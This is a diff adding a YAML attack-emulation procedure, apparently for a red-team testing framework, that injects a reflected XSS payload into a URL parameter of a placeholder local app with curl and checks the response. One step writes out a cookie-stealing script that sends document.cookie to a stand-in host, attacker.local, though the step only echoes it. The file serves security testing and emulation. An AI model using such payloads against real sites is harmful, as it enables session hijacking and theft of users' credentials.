@@ -1,0 +1,95 @@
+name: "014: Cross-site scripting (XSS)"
+description: "Exploit XSS vulnerabilities to inject malicious scripts and steal sensitive information"
+id: "g7h0d2i5-1f4e-7d9i-2g5h-8e6f1d4i9h0g"
+api_version: "2.0"
+platform: darwin
+tags:
+  - initial_access
+  - web_exploitation
+  - xss
+  - client_side_attack
+actors: []
+mitre_attack:
+  tactics:
+    - initial_access
+  techniques:
+    - T1190
+    - T1598
+procedure_examples: []
+arguments:
+  target_url:
+    description: "Target application URL with XSS vulnerability"
+    type: string
+    required: true
+    default: "http://vulnerable-app.local/search.php"
+  vulnerable_parameter:
+    description: "Parameter vulnerable to XSS injection"
+    type: string
+    required: true
+    default: "q"
+  xss_payload:
+    description: "XSS payload to inject"
+    type: string
+    required: true
+    default: "<script>alert('XSS')</script>"
+  xss_type:
+    description: "Type of XSS (reflected, stored, dom)"
+    type: string
+    required: true
+    default: "reflected"
+steps:
+  - name: "Craft XSS payload"
+    description: "Create XSS payload for injection"
+    command: |
+      echo "[*] Crafting XSS payload (Type: ${xss_type})"
+      payload="${xss_payload}"
+      echo "[*] Payload: ${payload}"
+      echo "${payload}" > /tmp/xss_payload.txt
+  - name: "Inject XSS payload"
+    description: "Inject the XSS payload into the vulnerable parameter"
+    command: |
+      echo "[*] Injecting XSS payload into ${vulnerable_parameter}"
+      encoded=$(echo "${xss_payload}" | jq -sRr @uri)
+      curl -s "${target_url}?${vulnerable_parameter}=${encoded}" > /tmp/xss_response.html
+      echo "[+] Response captured"
+  - name: "Verify XSS execution"
+    description: "Verify that the XSS payload was injected in the response"
+    command: |
+      echo "[*] Verifying XSS injection in response"
+      if grep -q "script\|javascript\|onerror\|onload" /tmp/xss_response.html; then
+        echo "[+] XSS payload detected in response"
+      else
+        echo "[-] XSS payload not found in response"
+      fi
+  - name: "Extract sensitive data"
+    description: "Attempt to extract cookies or session tokens via XSS"
+    command: |
+      echo "[*] Simulating data extraction via XSS"
+      cookie_payload="<script>fetch('http://attacker.local/steal?cookie='+document.cookie)</script>"
+      echo "[*] Cookie stealing payload would be injected"
+checks:
+  - name: "XSS payload presence check"
+    description: "Verify XSS payload is present in response"
+    command: "grep -q 'script\\|alert\\|javascript' /tmp/xss_response.html && echo 'PASS' || echo 'FAIL'"
+  - name: "Payload execution simulation"
+    description: "Verify payload would execute in browser context"
+    command: "grep -qi '<script>' /tmp/xss_response.html && echo 'PASS' || echo 'FAIL'"
+tests:
+  - name: "xss_injection_test"
+    description: "Test XSS injection in dry run mode"
+    dry_run: true
+    command: |
+      echo "[TEST] XSS Injection Test (Dry Run)"
+      echo "[TEST] Target: ${target_url}"
+      echo "[TEST] Parameter: ${vulnerable_parameter}"
+      echo "[TEST] Type: ${xss_type}"
+      echo "[TEST] Payload: ${xss_payload}"
+      echo "[TEST] Would inject payload and capture response"
+cleanup:
+  - name: "Remove XSS test artifacts"
+    description: "Clean up XSS testing files and payloads"
+    command: |
+      echo "[*] Cleaning up XSS test artifacts"
+      rm -f /tmp/xss_payload.txt 2>/dev/null
+      rm -f /tmp/xss_response.html 2>/dev/null
+      echo "[+] XSS cleanup complete"
